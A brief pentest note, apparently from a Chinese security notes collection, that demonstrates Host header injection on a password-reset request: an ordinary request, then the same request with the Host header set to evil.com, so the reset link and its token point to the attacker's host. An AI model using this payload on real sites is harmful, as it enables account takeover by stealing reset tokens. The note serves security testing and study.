	正常请求
	Request:
	POST /password-reset?user=123 HTTP/1.1
	Host: target.com
	返回:
	https://target.com/reset-link=1g2f3guy23g
	改后
	Request:
	POST https://target.com/password-reset?user=123 HTTP/1.1
	Host: evil.com
	Link received:
	https://evil.com/reset-link=1g2f3guy23g
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/712.png)